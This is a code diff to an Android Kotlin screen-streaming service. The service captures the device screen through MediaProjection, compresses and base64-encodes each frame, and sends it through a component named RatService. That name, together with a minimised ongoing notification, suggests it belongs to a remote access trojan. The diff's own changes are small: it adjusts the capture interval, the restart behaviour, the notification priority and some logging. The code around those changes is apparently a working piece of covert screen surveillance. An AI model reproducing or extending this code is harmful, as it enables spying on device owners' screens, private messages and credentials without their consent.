@@ -9,7 +9,6 @@ import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
-import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
@@ -26,7 +25,7 @@ class ScreenStreamService : Service() {
         const val TAG = "ScreenStream"
         const val NOTIF_ID = 201
         @Volatile var isStreaming: Boolean = false
-        @Volatile var intervalMs: Long = 150L
+        @Volatile var intervalMs: Long = 200L
     }
 
     private var virtualDisplay: VirtualDisplay? = null
@@ -48,18 +47,18 @@ class ScreenStreamService : Service() {
         slog("onStartCommand")
 
         if (isStreaming) {
-            slog("Already streaming — stop dulu")
+            slog("Already streaming")
             stopSelf()
             return START_NOT_STICKY
         }
 
         startForeground(NOTIF_ID, buildNotification())
 
-        val interval = intent?.getLongExtra("interval", 150L) ?: 150L
+        val interval = intent?.getLongExtra("interval", 200L) ?: 200L
         intervalMs = interval
 
         if (!ScreenCapture.isReady()) {
-            elog("MediaProjection NOT ready — abort")
+            elog("MediaProjection NOT ready")
             stopSelf()
             return START_NOT_STICKY
         }
@@ -71,7 +70,7 @@ class ScreenStreamService : Service() {
 
         startVirtualDisplay()
         loopCapture()
-        return START_STICKY
+        return START_NOT_STICKY
     }
 
     private fun buildNotification(): Notification {
@@ -86,7 +85,7 @@ class ScreenStreamService : Service() {
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setContentIntent(pi)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
     }
 
@@ -95,8 +94,7 @@ class ScreenStreamService : Service() {
         try {
             val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
             val metrics = DisplayMetrics()
-            @Suppress("DEPRECATION")
-            wm.defaultDisplay.getRealMetrics(metrics)
+            @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(metrics)
 
             val scale = 0.4f
             val width = (metrics.widthPixels * scale).toInt()
@@ -116,11 +114,8 @@ class ScreenStreamService : Service() {
                 handler
             )
 
-            if (virtualDisplay == null) {
-                elog("createVirtualDisplay returned null")
-            } else {
-                slog("Virtual display created")
-            }
+            if (virtualDisplay == null) elog("createVirtualDisplay null")
+            else slog("Virtual display created")
         } catch (e: Exception) {
             elog("startVirtualDisplay exception: ${e.message}")
         }
@@ -141,11 +136,7 @@ class ScreenStreamService : Service() {
                     val height = image.height
                     val rowPadding = rowStride - pixelStride * width
 
-                    val bmp = Bitmap.createBitmap(
-                        width + rowPadding / pixelStride,
-                        height,
-                        Bitmap.Config.ARGB_8888
-                    )
+                    val bmp = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                     bmp.copyPixelsFromBuffer(buffer)
                     val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)
                     val bos = ByteArrayOutputStream()
@@ -155,9 +146,7 @@ class ScreenStreamService : Service() {
                     frameCount++
                     val sent = RatService.instance?.sendFrame("screen_frame", b64) ?: false
 
-                    if (frameCount % 20 == 0) {
-                        slog("Frame #$frameCount sent=$sent size=${b64.length}")
-                    }
+                    if (frameCount % 20 == 0) slog("Frame #$frameCount sent=$sent")
                 } catch (e: Exception) {
                     elog("encode error: ${e.message}")
                 } finally {
